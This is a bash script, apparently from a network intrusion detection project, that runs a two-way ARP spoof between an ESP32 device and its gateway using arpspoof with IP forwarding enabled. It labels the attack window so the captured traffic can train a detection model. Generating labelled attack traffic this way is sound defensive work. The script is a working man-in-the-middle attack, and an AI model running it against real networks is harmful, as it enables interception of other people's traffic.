#!/usr/bin/env bash
# Two-way ARP spoof + labeling.
# Usage: sudo ./host/attacks/arpspoof.sh
#
# Needs managed Wi-Fi (not monitor). Visibility smoke: CSV gw_flip should rise
# vs IDLE (STA gateway MAC edge). Air LLC ARP was dropped (WPA2 opaque).
# Do not retrain model.h until that gate.
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=netconfig.sh
source "${DIR}/netconfig.sh"

TARGET_IP="$(get_esp32_ip)"
GATEWAY_IP="$(get_gateway_ip)"
DURATION="${NIDS_ARP_DURATION:-15}"

if ! command -v arpspoof >/dev/null 2>&1; then
  echo ">>> ERROR: arpspoof not found (install dsniff)" >&2
  exit 1
fi
if [[ "$TARGET_IP" == "$GATEWAY_IP" ]]; then
  echo ">>> ERROR: ESP32 and gateway IP are identical; check NIDS_ESP32_IP/NIDS_GATEWAY_IP" >&2
  exit 1
fi

if ip link show "${MON_IFACE}" >/dev/null 2>&1; then
  echo ">>> WARN: ${MON_IFACE} still up. ARP needs managed Wi-Fi."
  echo ">>> Run: sudo ./host/attacks/prepare_wifi.sh managed"
  echo ">>> then join SSID '${SSID}' before re-running."
  exit 1
fi

echo ">>> Target ESP32 IP : $TARGET_IP"
echo ">>> Gateway IP      : $GATEWAY_IP"
echo ">>> Interface       : $WIFI_IFACE"
ensure_label_path || exit 1
ensure_wifi_associated "$WIFI_IFACE" "$SSID" || exit 1
previous_forward="$(sysctl -n net.ipv4.ip_forward)"
pid1=""
pid2=""
label_sent=0
cleanup() {
  [[ -z "$pid1" ]] || kill "$pid1" 2>/dev/null || true
  [[ -z "$pid2" ]] || kill "$pid2" 2>/dev/null || true
  [[ -z "$pid1" ]] || wait "$pid1" 2>/dev/null || true
  [[ -z "$pid2" ]] || wait "$pid2" 2>/dev/null || true
  if [[ "$label_sent" -eq 1 ]]; then
    send_label STOP ARP_SPOOF || true
    label_sent=0
  fi
  sysctl -w "net.ipv4.ip_forward=${previous_forward}" >/dev/null || true
}
trap cleanup EXIT
echo ">>> Enabling IP forwarding (will restore ${previous_forward} on exit)..."
sysctl -w net.ipv4.ip_forward=1 >/dev/null

arpspoof -i "$WIFI_IFACE" -t "$TARGET_IP" "$GATEWAY_IP" >/dev/null 2>&1 &
pid1=$!
arpspoof -i "$WIFI_IFACE" -t "$GATEWAY_IP" "$TARGET_IP" >/dev/null 2>&1 &
pid2=$!
sleep 1
if ! kill -0 "$pid1" 2>/dev/null || ! kill -0 "$pid2" 2>/dev/null; then
  echo ">>> ERROR: an arpspoof process exited before labeling; check IP/interface/permissions" >&2
  exit 1
fi
echo ">>> READY FOR ARP SPOOF"
send_label START ARP_SPOOF
label_sent=1

echo ">>> Spoofing for ${DURATION}s (pids $pid1 $pid2)..."
sleep "$DURATION"
if ! kill -0 "$pid1" 2>/dev/null || ! kill -0 "$pid2" 2>/dev/null; then
  echo ">>> ERROR: an arpspoof process exited during the labeled interval" >&2
  exit 1
fi
trap - EXIT
cleanup
echo " >>> ATTACK FINISHED"
